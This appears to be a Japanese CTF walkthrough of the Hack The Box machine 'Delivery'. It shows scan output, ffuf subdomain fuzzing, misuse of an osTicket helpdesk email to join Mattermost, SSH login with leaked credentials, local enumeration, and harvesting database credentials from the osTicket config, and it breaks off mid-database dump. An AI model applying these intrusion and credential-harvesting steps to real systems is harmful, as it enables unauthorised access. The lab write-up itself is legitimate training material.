+ /site.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ 7963 requests: 3 error(s) and 164 item(s) reported on remote host
+ End Time:           2025-06-19 21:04:13 (GMT-7) (886 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

# Foothold
## FFUF
サブドメインファジング
```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://delivery.htb -H "Host: FUZZ.delivery.htb" -mc 200 -fs 10850

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://delivery.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.delivery.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 10850
________________________________________________

helpdesk                [Status: 200, Size: 4933, Words: 781, Lines: 103, Duration: 116ms]
:: Progress: [100000/100000] :: Job [1/1] :: 440 req/sec :: Duration: [0:04:20] :: Errors: 0 ::
                           
```

サブドメインに、helpdeskが見つかった

アクセスしてみる
![](https://i.imgur.com/Jp4vqRC.png)

OSTicketが展開してる
```sh
└─$ whatweb http://helpdesk.delivery.htb/
http://helpdesk.delivery.htb/ [200 OK] Bootstrap, Content-Language[en-US], Cookies[OSTSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], HttpOnly[OSTSESSID], IP[10.129.228.222], JQuery[3.5.1], PoweredBy[osTicket], Script[text/javascript], Title[delivery], UncommonHeaders[content-security-policy], X-UA-Compatible[IE=edge], nginx[1.14.2]
         
```

どうやらSupport Centerという、新しいチケット作って、それに対処するためのサイトらしい
- とりあえず適当に、チケットを作ってみる
	- ファイルも添付できるみたいだから、ファイルがサーバー上のどこに保存するかをみるためにファイルを添付する
![](https://i.imgur.com/4AoPR8a.png)

ファイルがどこに保存されているか
- `http://helpdesk.delivery.htb/file.php?key=kce9qa9hnqrs-yfeibai_ulc62y-aywk&expires=1750464000&signature=1908bcf0a2bf710ac5446e6ba5033b2a11bf7eb3&id=14`

![](https://i.imgur.com/1pj9yua.png)

得られたメールアドレスで、アカウント作成する
![](https://i.imgur.com/K9bRGpW.png)


アクティーションコードを受け取れた
![](https://i.imgur.com/VDByx5u.png)

リンクをクリックすることで、メールのアクティベーションができて、mattermostのチャンネルに入れた
![](https://i.imgur.com/9ziQpKB.png)

rootがこう言ってる！
```txt
@developers
本番公開前に、OSTicket用のテーマを更新してください。
サーバーの認証情報は maildeliverer:Youve_G0t_Mail! です。

それと、パスワードの使い回しをやめるためのプログラムも作成してください…特に "PleaseSubscribe!" のバリエーションみたいなやつは。

⸻

root
7:58 AM
「PleaseSubscribe!」は RockYou（辞書リスト）には載っていないかもしれないけど、もしハッカーにハッシュを取られたら、hashcat のルールを使えば簡単にすべてのバリエーションをクラックできる。
```

### maildelivererの認証情報
maildeliverer : Youve_G0t_Mail!

maildelivererの認証情報で、sshにログインできた！
```sh
┌──(kali㉿kali)-[~]
└─$ ssh maildeliverer@10.129.228.222                        
The authenticity of host '10.129.228.222 (10.129.228.222)' can't be established.
ED25519 key fingerprint is SHA256:AGdhHnQ749stJakbrtXVi48e6KTkaMj/+QNYMW+tyj8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.222' (ED25519) to the list of known hosts.
maildeliverer@10.129.228.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt
```

# Privilege Escalation

id
```sh
maildeliverer@Delivery:/$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
```

sudo -lはできない
```sh
maildeliverer@Delivery:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for maildeliverer: 
Sorry, user maildeliverer may not run sudo on Delivery.

```

/etc/passwdで、ユーザーを確認
- mysqlが動いてるかも？
```sh
maildeliverer@Delivery:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
avahi:x:106:115:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:116::/var/lib/saned:/usr/sbin/nologin
colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:110:118:MySQL Server,,,:/nonexistent:/bin/false
mattermost:x:998:998::/home/mattermost:/bin/sh

```

mountで、気になるフォルダがあるかをみるけど、特に重要そうなのはない
```sh
maildeliverer@Delivery:/$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=2005836k,nr_inodes=501459,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=404148k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=30,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=11400)
mqueue on /dev/mqueue type mqueue (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=404148k,mode=700,uid=1000,gid=1000)

```


crontabで、定期的に実行されるプログラムを確認する
```sh
maildeliverer@Delivery:/$ crontab -l
no crontab for maildeliverer
```
特にない


 Set User IDを確認する
```bash
maildeliverer@Delivery:/$ find / -type f -perm -04000 -ls 2>/dev/null
    29431     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    33503     20 -rwsr-xr-x   1 root     root          18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     6243     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   137443    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
    33500     24 -rwsr-xr-x   1 root     root          23288 Jan 15  2019 /usr/bin/pkexec
    22025     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
    43400    156 -rwsr-xr-x   1 root     root         157192 Jan 20  2021 /usr/bin/sudo
    18672     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
    22172     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
    18669     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
    22498     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
    18673     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
    18670     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
    22500     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
    43220     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount

```
- 気になるSUID
- `/usr/bin/pkexec`
	- sudoしかない
	- https://gtfobins.github.io/gtfobins/pkexec/


Set GIDも確認する
 -　特にない
```sh
maildeliverer@Delivery:/$ find / -uid 0 -perm -6000 -type f 2>/dev/null
maildeliverer@Delivery:/$ 
```

mysalが動いているのか確認
```sh
maildeliverer@Delivery:/var/www/osticket/upload$ ps aux | grep mysqld
mysql      625  0.3  2.6 1718720 106320 ?      Ssl  Jun19   0:31 /usr/sbin/mysqld
maildel+  2140  0.0  0.0   6076   888 pts/0    S+   01:45   0:00 grep mysqld
```
でも、maildelivererの認証情報ではログインできない
```sh
maildeliverer@Delivery:/var/www/osticket/upload$ mysql -u maildeliverer -p
Enter password: 
ERROR 1698 (28000): Access denied for user 'maildeliverer'@'localhost'

```


OSticketの設定ファイルを見る
- OSTicketの設定ファイル : ost-config.php
	- 参考 : https://docs.osticket.com/en/latest/Getting%20Started/Installation.html#getting-started
```bash
maildeliverer@Delivery:/var/www/osticket/upload/include$ cat ost-config.php
<?php
/*********************************************************************
    ost-config.php

    Static osTicket configuration file. Mainly useful for mysql login info.
    Created during installation process and shouldn't change even on upgrades.

    Peter Rotich <peter@osticket.com>
    Copyright (c)  2006-2010 osTicket
    http://www.osticket.com

    Released under the GNU General Public License WITHOUT ANY WARRANTY.
    See LICENSE.TXT for details.

    vim: expandtab sw=4 ts=4 sts=4:
    $Id: $
**********************************************************************/

#Disable direct access.
if(!strcasecmp(basename($_SERVER['SCRIPT_NAME']),basename(__FILE__)) || !defined('INCLUDE_DIR'))
    die('kwaheri rafiki!');

#Install flag
define('OSTINSTALLED',TRUE);
if(OSTINSTALLED!=TRUE){
    if(!file_exists(ROOT_DIR.'setup/install.php')) die('Error: Contact system admin.'); //Something is really wrong!
    //Invoke the installer.
    header('Location: '.ROOT_PATH.'setup/install.php');
    exit;
}

# Encrypt/Decrypt secret key - randomly generated during installation.
define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');

#Default admin email. Used only on db connection issues and related alerts.
define('ADMIN_EMAIL','maildeliverer@delivery.htb');

# Database Options
# ---------------------------------------------------
# Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');

# Table prefix
define('TABLE_PREFIX','ost_');

#
# SSL Options
# ---------------------------------------------------
# SSL options for MySQL can be enabled by adding a certificate allowed by
# the database server here. To use SSL, you must have a client certificate
# signed by a CA (certificate authority). You can easily create this
# yourself with the EasyRSA suite. Give the public CA certificate, and both
# the public and private parts of your client certificate below.
#
# Once configured, you can ask MySQL to require the certificate for
# connections:
#
# > create user osticket;
# > grant all on osticket.* to osticket require subject '<subject>';
#
# More information (to-be) available in doc/security/hardening.md

# define('DBSSLCA','/path/to/ca.crt');
# define('DBSSLCERT','/path/to/client.crt');
# define('DBSSLKEY','/path/to/client.key');

#
# Mail Options
# ---------------------------------------------------
# Option: MAIL_EOL (default: \n)
#
# Some mail setups do not handle emails with \r\n (CRLF) line endings for
# headers and base64 and quoted-response encoded bodies. This is an error
# and a violation of the internet mail RFCs. However, because this is also
# outside the control of both osTicket development and many server
# administrators, this option can be adjusted for your setup. Many folks who
# experience blank or garbled email from osTicket can adjust this setting to
# use "\n" (LF) instead of the CRLF default.
#
# References:
# http://www.faqs.org/rfcs/rfc2822.html
# https://github.com/osTicket/osTicket-1.8/issues/202
# https://github.com/osTicket/osTicket-1.8/issues/700
# https://github.com/osTicket/osTicket-1.8/issues/759
# https://github.com/osTicket/osTicket-1.8/issues/1217

# define(MAIL_EOL, "\r\n");

#
# HTTP Server Options
# ---------------------------------------------------
# Option: ROOT_PATH (default: <auto detect>, fallback: /)
#
# If you have a strange HTTP server configuration and osTicket cannot
# discover the URL path of where your osTicket is installed, define
# ROOT_PATH here.
#
# The ROOT_PATH is the part of the URL used to access your osTicket
# helpdesk before the '/scp' part and after the hostname. For instance, for
# http://mycompany.com/support', the ROOT_PATH should be '/support/'
#
# ROOT_PATH *must* end with a forward-slash!

# define('ROOT_PATH', '/support/');


# Option: TRUSTED_PROXIES (default: <none>)
#
# To support running osTicket installation on a web servers that sit behind a
# load balancer, HTTP cache, or other intermediary (reverse) proxy; it's
# necessary to define trusted proxies to protect against forged http headers
#
# osTicket supports passing the following http headers from a trusted proxy;
# - HTTP_X_FORWARDED_FOR    =>  Chain of client's IPs
# - HTTP_X_FORWARDED_PROTO  =>  Client's HTTP protocal (http | https)
#
# You'll have to explicitly define comma separated IP addreseses or CIDR of
# upstream proxies to trust. Wildcard "*" (not recommended) can be used to
# trust all chained IPs as proxies in cases that ISP/host doesn't provide
# IPs of loadbalancers or proxies.
#
# References:
# http://en.wikipedia.org/wiki/X-Forwarded-For
#

define('TRUSTED_PROXIES', '');


# Option: LOCAL_NETWORKS (default: 127.0.0.0/24)
#
# When running osTicket as part of a cluster it might become necessary to
# whitelist local/virtual networks that can bypass some authentication/checks.
#
# define comma separated IP addreseses or enter CIDR of local network.

define('LOCAL_NETWORKS', '127.0.0.0/24');


#
# Session Storage Options
# ---------------------------------------------------
# Option: SESSION_BACKEND (default: db)
#
# osTicket supports Memcache as a session storage backend if the `memcache`
# pecl extesion is installed. This also requires MEMCACHE_SERVERS to be
# configured as well.
#
# MEMCACHE_SERVERS can be defined as a comma-separated list of host:port
# specifications. If more than one server is listed, the session is written
# to all of the servers for redundancy.
#
# Values: 'db' (default)
#         'memcache' (Use Memcache servers)
#         'system' (use PHP settings as configured (not recommended!))
#
# define('SESSION_BACKEND', 'memcache');
# define('MEMCACHE_SERVERS', 'server1:11211,server2:11211');
?>

```


このファイルから、mysqlの認証情報がわかる
```sh
# Database Options
# ---------------------------------------------------
# Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');

# Table prefix
define('TABLE_PREFIX','ost_');
```

### Mysql認証情報
ost_user : !H3lpD3sk123!

mysqlにログインする
```bash
maildeliverer@Delivery:/var/www/osticket/upload/include$ mysql -u ost_user -p'!H3lpD3sk123!'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5882
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| osticket           |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use osticket;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [osticket]> show tables;
+--------------------------+
| Tables_in_osticket       |
+--------------------------+
| ost__search              |
| ost_api_key              |
| ost_attachment           |
| ost_canned_response      |
| ost_config               |
| ost_content              |
| ost_department           |
| ost_draft                |
| ost_email                |
| ost_email_account        |
| ost_email_template       |
| ost_email_template_group |
| ost_event                |
| ost_faq                  |
| ost_faq_category         |
| ost_faq_topic            |
| ost_file                 |
| ost_file_chunk           |
| ost_filter               |
| ost_filter_action        |
| ost_filter_rule          |
| ost_form                 |
| ost_form_entry           |
| ost_form_entry_values    |
| ost_form_field           |
| ost_group                |
| ost_help_topic           |
| ost_help_topic_form      |
| ost_list                 |
| ost_list_items           |
| ost_lock                 |
| ost_note                 |
| ost_organization         |
| ost_plugin               |
| ost_queue                |
| ost_queue_column         |
| ost_queue_columns        |
| ost_queue_config         |
| ost_queue_export         |
| ost_queue_sort           |
| ost_queue_sorts          |
| ost_role                 |
| ost_schedule             |
| ost_schedule_entry       |
| ost_sequence             |
| ost_session              |
| ost_sla                  |
| ost_staff                |
| ost_staff_dept_access    |
| ost_syslog               |
| ost_task                 |
| ost_task__cdata          |
| ost_team                 |
| ost_team_member          |
| ost_thread               |
| ost_thread_collaborator  |
| ost_thread_entry         |
| ost_thread_entry_email   |
| ost_thread_entry_merge   |
| ost_thread_event         |
| ost_thread_referral      |
| ost_ticket               |
| ost_ticket__cdata        |
| ost_ticket_priority      |
| ost_ticket_status        |
| ost_translation          |
| ost_user                 |
| ost_user__cdata          |
| ost_user_account         |
| ost_user_email           |
+--------------------------+
70 rows in set (0.001 sec)

```

ost_user
```bash
MariaDB [osticket]> select * from ost_user;
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
| id | org_id | default_email_id | status | name                             | created             | updated             |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
|  1 |      1 |                1 |      0 | osTicket Support                 | 2020-12-26 09:14:00 | 2020-12-26 09:14:00 |
